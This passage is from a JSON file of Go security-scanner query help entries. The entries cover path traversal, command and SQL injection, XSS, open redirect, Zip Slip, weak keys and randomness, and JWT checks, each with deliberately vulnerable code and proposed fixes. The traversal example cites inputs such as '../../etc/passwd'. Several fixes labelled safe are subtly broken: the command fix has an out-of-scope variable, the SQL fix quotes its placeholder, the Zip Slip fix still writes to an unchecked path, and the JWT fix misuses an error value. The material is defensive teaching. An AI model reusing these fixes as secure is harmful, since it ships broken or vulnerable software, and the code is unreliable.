    "help": "# Use of a weak cryptographic key\nIncorrect uses of encryption algorithms may result in sensitive data exposure, key leakage, broken authentication, insecure session, and spoofing attacks.\n\n\n## Recommendation\nEnsure that you use a strong key with a recommended bit size. For RSA encryption the minimum size is 2048 bits.\n\n\n## Example\nThe following code uses RSA encryption with insufficient key size.\n\n\n```go\npackage main\n\nimport (\n\t\"crypto/rand\"\n\t\"crypto/rsa\"\n\t\"fmt\"\n)\n\nfunc main() {\n\t//Generate Private Key\n\tpvk, err := rsa.GenerateKey(rand.Reader, 1024)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n\tfmt.Println(pvk)\n}\n\n```\nIn the example below, the key size is set to 2048 bits.\n\n\n```go\npackage main\n\nimport (\n\t\"crypto/rand\"\n\t\"crypto/rsa\"\n\t\"fmt\"\n)\n\nfunc main() {\n\t//Generate Private Key\n\tpvk, err := rsa.GenerateKey(rand.Reader, 2048)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n\tfmt.Println(pvk)\n}\n\n```\n\n## References\n* OWASP: [Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html).\n* Wikipedia: [Cryptographically Strong Algorithms](https://en.wikipedia.org/wiki/Strong_cryptography#Cryptographically_strong_algorithms).\n* Wikipedia: [Strong Cryptography Examples](https://en.wikipedia.org/wiki/Strong_cryptography#Examples).\n* NIST, FIPS 140 Annex a: [ Approved Security Functions](http://csrc.nist.gov/publications/fips/fips140-2/fips1402annexa.pdf).\n* NIST, SP 800-131A: [ Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths](http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf).\n* Common Weakness Enumeration: [CWE-326](https://cwe.mitre.org/data/definitions/326.html).\n"
  },
  "go/path-injection": {
    "name": "Uncontrolled data used in path expression",
    "description": "Accessing paths influenced by users can allow an attacker to access unexpected resources.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "go/path-injection",
    "tags": [
      "security",
      "external/cwe/cwe-022",
      "external/cwe/cwe-023",
      "external/cwe/cwe-036",
      "external/cwe/cwe-073",
      "external/cwe/cwe-099"
    ],
    "filename": "011318e1-TaintedPath",
    "language": "go",
    "help": "# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\nPaths that are naively constructed from data controlled by a user may be absolute paths, or may contain unexpected special characters such as \"..\". Such a path could point anywhere on the file system.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nCommon validation methods include checking that the normalized path is relative and does not contain any \"..\" components, or checking that the path is contained within a safe folder. The method you should use depends on how the path is used in the application, and whether the path should be a single path component.\n\nIf the path should be a single path component (such as a file name), you can check for the existence of any path separators (\"/\" or \"\\\\\"), or \"..\" sequences in the input, and reject the input if any are found.\n\nNote that removing \"../\" sequences is *not* sufficient, since the input could still contain a path separator followed by \"..\". For example, the input \".../...//\" would still result in the string \"../\" if only \"../\" sequences are removed.\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first example, a file name is read from an HTTP request and then used to access a file. However, a malicious user could enter a file name which is an absolute path, such as \"/etc/passwd\".\n\nIn the second example, it appears that the user is restricted to opening a file within the `\"user\"` home directory. However, a malicious user could enter a file name containing special characters. For example, the string `\"../../etc/passwd\"` will result in the code reading the file located at \"/home/user/../../etc/passwd\", which is the system's password file. This file would then be sent back to the user, giving them access to password information.\n\n\n```go\npackage main\n\nimport (\n\t\"io/ioutil\"\n\t\"net/http\"\n\t\"path/filepath\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tpath := r.URL.Query()[\"path\"][0]\n\n\t// BAD: This could read any file on the file system\n\tdata, _ := ioutil.ReadFile(path)\n\tw.Write(data)\n\n\t// BAD: This could still read any file on the file system\n\tdata, _ = ioutil.ReadFile(filepath.Join(\"/home/user/\", path))\n\tw.Write(data)\n}\n\n```\nIf the input should only be a file name, you can check that it doesn't contain any path separators or \"..\" sequences.\n\n\n```go\npackage main\n\nimport (\n\t\"io/ioutil\"\n\t\"net/http\"\n\t\"path/filepath\"\n\t\"strings\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tpath := r.URL.Query()[\"path\"][0]\n\n\t// GOOD: ensure that the filename has no path separators or parent directory references\n\t// (Note that this is only suitable if `path` is expected to have a single component!)\n\tif strings.Contains(path, \"/\") || strings.Contains(path, \"\\\\\") || strings.Contains(path, \"..\") {\n\t\thttp.Error(w, \"Invalid file name\", http.StatusBadRequest)\n\t\treturn\n\t}\n\tdata, _ := ioutil.ReadFile(filepath.Join(\"/home/user/\", path))\n\tw.Write(data)\n}\n\n```\nNote that this approach is only suitable if the input is expected to be a single file name.\n\nIf the input can be a path with multiple components, you can make it safe by verifying that the path is within a specific directory that is considered safe. You can do this by resolving the input with respect to that directory, and then checking that the resulting path is still within it.\n\n\n```go\npackage main\n\nimport (\n\t\"io/ioutil\"\n\t\"net/http\"\n\t\"path/filepath\"\n\t\"strings\"\n)\n\nconst safeDir = \"/home/user/\"\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tpath := r.URL.Query()[\"path\"][0]\n\n\t// GOOD: ensure that the resolved path is within the safe directory\n\tabsPath, err := filepath.Abs(filepath.Join(safeDir, path))\n\tif err != nil || !strings.HasPrefix(absPath, safeDir) {\n\t\thttp.Error(w, \"Invalid file name\", http.StatusBadRequest)\n\t\treturn\n\t}\n\tdata, _ := ioutil.ReadFile(absPath)\n\tw.Write(data)\n}\n\n```\nNote that `/home/user` is just an example, you should replace it with the actual safe directory in your application. Also, while in this example the path of the safe directory is absolute, this may not always be the case, and you may need to resolve it first before checking the input.\n\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n"
  },
  "go/stored-command": {
    "name": "Command built from stored data",
    "description": "Building a system command from stored data that is user-controlled can lead to execution of malicious code by the user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "low",
    "id": "go/stored-command",
    "tags": [
      "security",
      "external/cwe/cwe-078"
    ],
    "filename": "8a1fc84f-StoredCommand",
    "language": "go",
    "help": "# Command built from stored data\nIf a system command invocation is built from stored data without sufficient sanitization, and that data is stored from a user input, a malicious user may be able to run commands to exfiltrate data or compromise the system.\n\n\n## Recommendation\nIf possible, use hard-coded string literals to specify the command to run. Instead of interpreting stored input directly as command names, examine the input and then choose among hard-coded string literals.\n\nIf this is not possible, then add sanitization code to verify that the user input is safe before using it.\n\n\n## Example\nIn the following example, the function `run` runs a command directly from the result of a query:\n\n\n```go\npackage main\n\nimport (\n\t\"database/sql\"\n\t\"os/exec\"\n)\n\nvar db *sql.DB\n\nfunc run(query string) {\n\trows, _ := db.Query(query)\n\tvar cmdName string\n\trows.Scan(&cmdName)\n\tcmd := exec.Command(cmdName)\n\tcmd.Run()\n}\n\n```\nThe function extracts the name of a system command from the database query, and then runs it without any further checks, which can cause a command-injection vulnerability. A possible solution is to ensure that commands are checked against a whitelist:\n\n\n```go\npackage main\n\nimport (\n\t\"database/sql\"\n\t\"os/exec\"\n)\n\nvar db *sql.DB\n\nfunc run(query string) {\n\trows, _ := db.Query(query)\n\tvar cmdName string\n\trows.Scan(&cmdName)\n\tif cmdName == \"mybinary1\" || cmdName == \"mybinary2\" {\n\t\tcmd := exec.Command(cmdName)\n\t}\n\tcmd.Run()\n}\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n"
  },
  "go/unvalidated-url-redirection": {
    "name": "Open URL redirect",
    "description": "Open URL redirection based on unvalidated user input may cause redirection to malicious web sites.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.1,
    "id": "go/unvalidated-url-redirection",
    "tags": [
      "security",
      "external/cwe/cwe-601"
    ],
    "precision": "high",
    "filename": "6c31d3d7-OpenUrlRedirect",
    "language": "go",
    "help": "# Open URL redirect\nDirectly incorporating user input into a URL redirect request without validating the input can facilitate phishing attacks. In these attacks, unsuspecting users can be redirected to a malicious site that looks very similar to the real site they intend to visit, but is controlled by the attacker.\n\n\n## Recommendation\nTo guard against untrusted URL redirection, it is advisable to avoid putting user input directly into a redirect URL. Instead, maintain a list of authorized redirects on the server; then choose from that list based on the user input provided.\n\nIf this is not possible, then the user input should be validated in some other way, for example, by verifying that the target URL is local and does not redirect to a different host.\n\n\n## Example\nThe following example shows an HTTP request parameter being used directly in a URL redirect without validating the input, which facilitates phishing attacks:\n\n\n```go\npackage main\n\nimport (\n\t\"net/http\"\n)\n\nfunc serve() {\n\thttp.HandleFunc(\"/redir\", func(w http.ResponseWriter, r *http.Request) {\n\t\tr.ParseForm()\n\t\thttp.Redirect(w, r, r.Form.Get(\"target\"), 302)\n\t})\n}\n\n```\nOne way to remedy the problem is to parse the target URL and check that its hostname is empty, which means that it is a relative URL:\n\n\n```go\npackage main\n\nimport (\n\t\"net/http\"\n\t\"net/url\"\n\t\"strings\"\n)\n\nfunc serve1() {\n\thttp.HandleFunc(\"/redir\", func(w http.ResponseWriter, r *http.Request) {\n\t\tr.ParseForm()\n\t\ttargetUrl := r.Form.Get(\"target\")\n\t\t// replace all backslashes with forward slashes before parsing the URL\n\t\ttargetUrl = strings.ReplaceAll(targetUrl, \"\\\\\", \"/\")\n\n\t\ttarget, err := url.Parse(targetUrl)\n\t\tif err != nil {\n\t\t\t// ...\n\t\t}\n\n\t\tif target.Hostname() == \"\" {\n\t\t\t// GOOD: check that it is a local redirect\n\t\t\thttp.Redirect(w, r, target.String(), 302)\n\t\t} else {\n\t\t\tw.WriteHeader(400)\n\t\t}\n\t})\n}\n\n```\nNote that some browsers treat backslashes in URLs as forward slashes. To account for this, we replace all backslashes with forward slashes before parsing the URL and checking its hostname.\n\n\n## References\n* OWASP: [ XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-601](https://cwe.mitre.org/data/definitions/601.html).\n"
  },
  "go/log-injection": {
    "name": "Log entries created from user input",
    "description": "Building log entries from user-controlled sources is vulnerable to insertion of forged log entries by a malicious user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "medium",
    "id": "go/log-injection",
    "tags": [
      "security",
      "external/cwe/cwe-117"
    ],
    "filename": "ccbb9845-LogInjection",
    "language": "go",
    "help": "# Log entries created from user input\nIf unsanitized user input is written to a log entry, a malicious user may be able to forge new log entries.\n\nForgery can occur if a user provides some input with characters that are interpreted when the log output is displayed. If the log is displayed as a plain text file, then new line characters can be used by a malicious user. If the log is displayed as HTML, then arbitrary HTML may be included to spoof log entries.\n\n\n## Recommendation\nUser input should be suitably encoded before it is logged.\n\nIf the log entries are plain text then line breaks should be removed from user input, using `strings.Replace` or similar. Care should also be taken that user input is clearly marked in log entries, and that a malicious user cannot cause confusion in other ways.\n\nFor log entries that will be displayed in HTML, user input should be HTML encoded using `html.EscapeString` or similar before being logged, to prevent forgery and other forms of HTML injection.\n\n\n## Example\nIn the following example, a user name, provided by the user, is logged using a logging framework without any sanitization.\n\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n)\n\n// BAD: A user-provided value is written directly to a log.\nfunc handler(req *http.Request) {\n\tusername := req.URL.Query()[\"username\"][0]\n\tlog.Printf(\"user %s logged in.\\n\", username)\n}\n\n```\nIn the next example, `strings.Replace` is used to ensure no line endings are present in the user input.\n\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n\t\"strings\"\n)\n\n// GOOD: The user-provided value is escaped before being written to the log.\nfunc handlerGood(req *http.Request) {\n\tusername := req.URL.Query()[\"username\"][0]\n\tescapedUsername := strings.ReplaceAll(username, \"\\n\", \"\")\n\tescapedUsername = strings.ReplaceAll(escapedUsername, \"\\r\", \"\")\n\tlog.Printf(\"user %s logged in.\\n\", escapedUsername)\n}\n\n```\n\n## References\n* OWASP: [Log Injection](https://www.owasp.org/index.php/Log_Injection).\n* Common Weakness Enumeration: [CWE-117](https://cwe.mitre.org/data/definitions/117.html).\n"
  },
  "go/insecure-randomness": {
    "name": "Use of insufficient randomness as the key of a cryptographic algorithm",
    "description": "Using insufficient randomness as the key of a cryptographic algorithm can allow an attacker to compromise security.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "id": "go/insecure-randomness",
    "tags": [
      "security",
      "external/cwe/cwe-338"
    ],
    "filename": "16b5f8ea-InsecureRandomness",
    "language": "go",
    "help": "# Use of insufficient randomness as the key of a cryptographic algorithm\nUsing a cryptographically weak pseudo-random number generator to generate a security-sensitive value, such as a password, makes it easier for an attacker to predict the value.\n\nPseudo-random number generators generate a sequence of numbers that only approximates the properties of random numbers. The sequence is not truly random because it is completely determined by a relatively small set of initial values, the seed. If the random number generator is cryptographically weak, then this sequence may be easily predictable through outside observations.\n\n\n## Recommendation\nUse a cryptographically secure pseudo-random number generator if the output is to be used in a security sensitive context. As a rule of thumb, a value should be considered \"security sensitive\" if predicting it would allow the attacker to perform an action that they would otherwise be unable to perform. For example, if an attacker could predict the random password generated for a new user, they would be able to log in as that new user.\n\nFor Go, `crypto/rand` provides a cryptographically secure pseudo-random number generator. `math/rand` is not cryptographically secure, and should be avoided in security contexts. For contexts which are not security sensitive, `math/rand` may be preferable as it has a more convenient interface, and is likely to be faster.\n\n\n## Example\nThe example below uses the `math/rand` package instead of `crypto/rand` to generate a password:\n\n\n```go\npackage main\n\nimport (\n\t\"math/rand\"\n)\n\nvar charset = []rune(\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\")\n\nfunc generatePassword() string {\n\ts := make([]rune, 20)\n\tfor i := range s {\n\t\ts[i] = charset[rand.Intn(len(charset))]\n\t}\n\treturn string(s)\n}\n\n```\nInstead, use `crypto/rand`:\n\n\n```go\npackage main\n\nimport (\n\t\"crypto/rand\"\n\t\"math/big\"\n)\n\nfunc generatePasswordGood() string {\n\ts := make([]rune, 20)\n\tfor i := range s {\n\t\tidx, err := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))\n\t\tif err != nil {\n\t\t\t// handle err\n\t\t}\n\t\ts[i] = charset[idx.Int64()]\n\t}\n\treturn string(s)\n}\n\n```\n\n## References\n* Wikipedia. [Pseudo-random number generator](http://en.wikipedia.org/wiki/Pseudorandom_number_generator).\n* OWASP: [Insecure Randomness](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness).\n* OWASP: [Secure Random Number Generation](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation).\n* Common Weakness Enumeration: [CWE-338](https://cwe.mitre.org/data/definitions/338.html).\n"
  },
  "go/missing-jwt-signature-check": {
    "name": "Missing JWT signature check",
    "description": "Failing to check the JSON Web Token (JWT) signature may allow an attacker to forge their own tokens.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "id": "go/missing-jwt-signature-check",
    "tags": [
      "security",
      "external/cwe/cwe-347"
    ],
    "filename": "f8055ad6-MissingJwtSignatureCheck",
    "language": "go",
    "help": "# Missing JWT signature check\nApplications decoding a JSON Web Token (JWT) may be vulnerable when the signature is not correctly verified.\n\n\n## Recommendation\nAlways verify the signature by using the appropriate methods provided by the JWT library, or use a library that verifies it by default.\n\n\n## Example\nThe following (bad) example shows a case where a JWT is parsed without verifying the signature.\n\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\n\t\"github.com/golang-jwt/jwt/v5\"\n)\n\ntype User struct{}\n\nfunc decodeJwt(token string) {\n\t// BAD: JWT is only decoded without signature verification\n\tfmt.Println(\"only decoding JWT\")\n\tDecodedToken, _, err := jwt.NewParser().ParseUnverified(token, &User{})\n\tif claims, ok := DecodedToken.Claims.(*User); ok {\n\t\tfmt.Printf(\"DecodedToken:%v\\n\", claims)\n\t} else {\n\t\tlog.Fatal(\"error\", err)\n\t}\n}\n\n```\nThe following (good) example uses the appropriate function for parsing a JWT and verifying its signature.\n\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\n\t\"github.com/golang-jwt/jwt/v5\"\n)\n\ntype User struct{}\n\nfunc parseJwt(token string, jwtKey []byte) {\n\t// GOOD: JWT is parsed with signature verification using jwtKey\n\tDecodedToken, err := jwt.ParseWithClaims(token, &User{}, func(token *jwt.Token) (interface{}, error) {\n\t\treturn jwtKey, nil\n\t})\n\tif claims, ok := DecodedToken.Claims.(*User); ok && DecodedToken.Valid && !err {\n\t\tfmt.Printf(\"DecodedToken:%v\\n\", claims)\n\t} else {\n\t\tlog.Fatal(err)\n\t}\n}\n\n```\n\n## References\n* JWT IO: [Introduction to JSON Web Tokens](https://jwt.io/introduction).\n* jwt-go: [Documentation](https://pkg.go.dev/github.com/golang-jwt/jwt/v5).\n* Go JOSE: [Documentation](https://pkg.go.dev/github.com/go-jose/go-jose/v3).\n* Common Weakness Enumeration: [CWE-347](https://cwe.mitre.org/data/definitions/347.html).\n"
  },
  "go/count-untrusted-data-external-api": {
    "name": "Frequency counts for external APIs that are used with untrusted data",
    "description": "This reports the external APIs that are used with untrusted data, along with how frequently the API is called, and how many unique sources of untrusted data flow to it.",
    "id": "go/count-untrusted-data-external-api",
    "kind": "table",
    "tags": [
      "security external/cwe/cwe-20"
    ],
    "filename": "7581a5e3-ExternalAPIsUsedWithUntrustedData",
    "language": "go",
    "help": "# Frequency counts for external APIs that are used with untrusted data\nUsing unsanitized untrusted data in an external API can cause a variety of security issues. This query reports all external APIs that are used with untrusted data, along with how frequently the API is used, and how many unique sources of untrusted data flow to this API. This query is designed primarily to help identify which APIs may be relevant for security analysis of this application.\n\nAn external API is defined as a call to a function that is not defined in the source code and is not modeled as a taint step in the default taint library. Calls made in test files are excluded. External APIs may be from the Go standard library, third party dependencies, or from internal dependencies. The query will report the fully-qualified method name, along with either `[param x]`, where `x` indicates the position of the parameter receiving the untrusted data, or `[receiver]` indicating that the untrusted data is used as the receiver of the method call.\n\n\n## Recommendation\nFor each result:\n\n* If the result highlights a known sink, no action is required.\n* If the result highlights an unknown sink for a problem, then add modeling for the sink to the relevant query.\n* If the result represents a call to an external API which transfers taint (for example, from a parameter to its return value), add the appropriate modeling, and re-run the query to determine what new results have appeared due to this additional modeling.\nOtherwise, the result is likely uninteresting. Custom versions of this query can extend the `SafeExternalAPIMethod` class to exclude known safe external APIs from future analysis.\n\n\n## Example\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc serve() {\n\thttp.HandleFunc(\"/user\", func(w http.ResponseWriter, r *http.Request) {\n\t\tr.ParseForm()\n\t\tusername := r.Form.Get(\"username\")\n\t\tif !isValidUsername(username) {\n\t\t\t// BAD: a request parameter is incorporated without validation into the response\n\t\t\tfmt.Fprintf(w, \"%q is an unknown user\", username)\n\t\t} else {\n\t\t\t// TODO: Handle successful login\n\t\t}\n\t})\n\thttp.ListenAndServe(\":80\", nil)\n}\n\n```\nIf the query were to return the API `fmt.Fprintf [param 2]` then we should first consider whether this a security relevant sink. In this case, this is writing to an HTTP response, so we should consider whether this is an XSS sink. If it is, we should confirm that it is handled by the \"Reflected cross-site scripting\" query (`go/reflected-xss`).\n\n\n```go\npackage main\n\nimport (\n\t\"database/sql\"\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc handler(db *sql.DB, req *http.Request) {\n\tq := fmt.Sprintf(\"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='%s' ORDER BY PRICE\",\n\t\treq.URL.Query()[\"category\"])\n\tdb.Query(q)\n}\n\n```\nIf the query were to return the API `fmt.Sprintf [param 1]`, then this should be reviewed as a possible taint step, because tainted data would flow from the first argument to the return value of the call.\n\nNote that both examples are correctly handled by the standard taint tracking library and the \"Reflected cross-site scripting\" query (`go/reflected-xss`).\n\n\n## References\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "go/reflected-xss": {
    "name": "Reflected cross-site scripting",
    "description": "Writing user input directly to an HTTP response allows for a cross-site scripting vulnerability.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "precision": "high",
    "id": "go/reflected-xss",
    "tags": [
      "security",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "5f9d931a-ReflectedXss",
    "language": "go",
    "help": "# Reflected cross-site scripting\nDirectly writing user input (for example, an HTTP request parameter) to an HTTP response without properly sanitizing the input first, allows for a cross-site scripting vulnerability.\n\nThis kind of vulnerability is also called *reflected* cross-site scripting, to distinguish it from other types of cross-site scripting.\n\n\n## Recommendation\nTo guard against cross-site scripting, consider using contextual output encoding/escaping before writing user input to the response, or one of the other solutions that are mentioned in the references.\n\n\n## Example\nThe following example code writes part of an HTTP request (which is controlled by the user) directly to the response. This leaves the website vulnerable to cross-site scripting.\n\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc serve() {\n\thttp.HandleFunc(\"/user\", func(w http.ResponseWriter, r *http.Request) {\n\t\tr.ParseForm()\n\t\tusername := r.Form.Get(\"username\")\n\t\tif !isValidUsername(username) {\n\t\t\t// BAD: a request parameter is incorporated without validation into the response\n\t\t\tfmt.Fprintf(w, \"%q is an unknown user\", username)\n\t\t} else {\n\t\t\t// TODO: Handle successful login\n\t\t}\n\t})\n\thttp.ListenAndServe(\":80\", nil)\n}\n\n```\nSanitizing the user-controlled data prevents the vulnerability:\n\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"html\"\n\t\"net/http\"\n)\n\nfunc serve1() {\n\thttp.HandleFunc(\"/user\", func(w http.ResponseWriter, r *http.Request) {\n\t\tr.ParseForm()\n\t\tusername := r.Form.Get(\"username\")\n\t\tif !isValidUsername(username) {\n\t\t\t// GOOD: a request parameter is escaped before being put into the response\n\t\t\tfmt.Fprintf(w, \"%q is an unknown user\", html.EscapeString(username))\n\t\t} else {\n\t\t\t// TODO: do something exciting\n\t\t}\n\t})\n\thttp.ListenAndServe(\":80\", nil)\n}\n\n```\n\n## References\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "go/zipslip": {
    "name": "Arbitrary file access during archive extraction (\"Zip Slip\")",
    "description": "Extracting files from a malicious ZIP file, or similar type of archive, without validating that the destination file path is within the destination directory can allow an attacker to unexpectedly gain access to resources.",
    "kind": "path-problem",
    "id": "go/zipslip",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "tags": [
      "security",
      "external/cwe/cwe-022"
    ],
    "filename": "011318e1-ZipSlip",
    "language": "go",
    "help": "# Arbitrary file access during archive extraction (\"Zip Slip\")\nExtracting files from a malicious zip file, or similar type of archive, is at risk of directory traversal attacks if filenames from the archive are not properly validated. archive paths.\n\nZip archives contain archive entries representing each file in the archive. These entries include a file path for the entry, but these file paths are not restricted and may contain unexpected special elements such as the directory traversal element (`..`). If these file paths are used to create a filesystem path, then a file operation may happen in an unexpected location. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\nFor example, if a zip file contains a file entry `..\\sneaky-file`, and the zip file is extracted to the directory `c:\\output`, then naively combining the paths would result in an output file path of `c:\\output\\..\\sneaky-file`, which would cause the file to be written to `c:\\sneaky-file`.\n\n\n## Recommendation\nEnsure that output paths constructed from zip archive entries are validated to prevent writing files to unexpected locations.\n\nThe recommended way of writing an output file from a zip archive entry is to check that \"`..`\" does not occur in the path.\n\n\n## Example\nIn this example an archive is extracted without validating file paths. If `archive.zip` contained relative paths (for instance, if it were created by something like `zip archive.zip ../file.txt`) then executing this code could write to locations outside the destination directory.\n\n\n```go\npackage main\n\nimport (\n\t\"archive/zip\"\n\t\"io/ioutil\"\n\t\"path/filepath\"\n)\n\nfunc unzip(f string) {\n\tr, _ := zip.OpenReader(f)\n\tfor _, f := range r.File {\n\t\tp, _ := filepath.Abs(f.Name)\n\t\t// BAD: This could overwrite any file on the file system\n\t\tioutil.WriteFile(p, []byte(\"present\"), 0666)\n\t}\n}\n\n```\nTo fix this vulnerability, we need to check that the path does not contain any \"`..`\" elements in it.\n\n\n```go\npackage main\n\nimport (\n\t\"archive/zip\"\n\t\"io/ioutil\"\n\t\"path/filepath\"\n\t\"strings\"\n)\n\nfunc unzipGood(f string) {\n\tr, _ := zip.OpenReader(f)\n\tfor _, f := range r.File {\n\t\tp, _ := filepath.Abs(f.Name)\n\t\t// GOOD: Check that path does not contain \"..\" before using it\n\t\tif !strings.Contains(f.Name, \"..\") {\n\t\t\tioutil.WriteFile(p, []byte(\"present\"), 0666)\n\t\t}\n\t}\n}\n\n```\n\n## References\n* Snyk: [Zip Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability).\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n"
  },
  "go/sql-injection": {
    "name": "Database query built from user-controlled sources",
    "description": "Building a database query from user-controlled sources is vulnerable to insertion of malicious code by the user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.8,
    "precision": "high",
    "id": "go/sql-injection",
    "tags": [
      "security",
      "external/cwe/cwe-089"
    ],
    "filename": "a50807d0-SqlInjection",
    "language": "go",
    "help": "# Database query built from user-controlled sources\nIf a database query (such as an SQL or NoSQL query) is built from user-provided data without sufficient sanitization, a malicious user may be able to run commands that exfiltrate, tamper with, or destroy data stored in the database.\n\n\n## Recommendation\nMost database connector libraries offer a way of safely embedding untrusted data into a query by means of query parameters or prepared statements. Use these features rather than building queries by string concatenation.\n\n\n## Example\nIn the following example, assume the function `handler` is an HTTP request handler in a web application, whose parameter `req` contains the request object:\n\n\n```go\npackage main\n\nimport (\n\t\"database/sql\"\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc handler(db *sql.DB, req *http.Request) {\n\tq := fmt.Sprintf(\"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='%s' ORDER BY PRICE\",\n\t\treq.URL.Query()[\"category\"])\n\tdb.Query(q)\n}\n\n```\nThe handler constructs an SQL query involving user input taken from the request object unsafely using `fmt.Sprintf` to embed a request parameter directly into the query string `q`. The parameter may include quote characters, allowing a malicious user to terminate the string literal into which the parameter is embedded and add arbitrary SQL code after it.\n\nInstead, the untrusted query parameter should be safely embedded using placeholder parameters:\n\n\n```go\npackage main\n\nimport (\n\t\"database/sql\"\n\t\"net/http\"\n)\n\nfunc handlerGood(db *sql.DB, req *http.Request) {\n\tq := \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='?' ORDER BY PRICE\"\n\tdb.Query(q, req.URL.Query()[\"category\"])\n}\n\n```\n\n## References\n* Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n"
  },
  "go/incomplete-hostname-regexp": {
    "name": "Incomplete regular expression for hostnames",
    "description": "Matching a URL or hostname against a regular expression that contains an unescaped dot as part of the hostname might match more hostnames than expected.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "go/incomplete-hostname-regexp",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-20"
    ],
    "filename": "7581a5e3-IncompleteHostnameRegexp",
    "language": "go",
    "help": "# Incomplete regular expression for hostnames\nSanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. Often, this is done by checking that the host of a URL is in a set of allowed hosts.\n\nIf a regular expression implements such a check, it is easy to accidentally make the check too permissive by not escaping regular-expression meta-characters such as `.`.\n\nEven if the check is not used in a security-critical context, the incomplete check may still cause undesirable behavior when it accidentally succeeds.\n\n\n## Recommendation\nEscape all meta-characters appropriately when constructing regular expressions for security checks, paying special attention to the `.` meta-character.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains.\n\n\n```go\npackage main\n\nimport (\n\t\"errors\"\n\t\"net/http\"\n\t\"regexp\"\n)\n\nfunc checkRedirect(req *http.Request, via []*http.Request) error {\n\t// BAD: the host of `req.URL` may be controlled by an attacker\n\tre := \"^((www|beta).)?example.com/\"\n\tif matched, _ := regexp.MatchString(re, req.URL.Host); matched 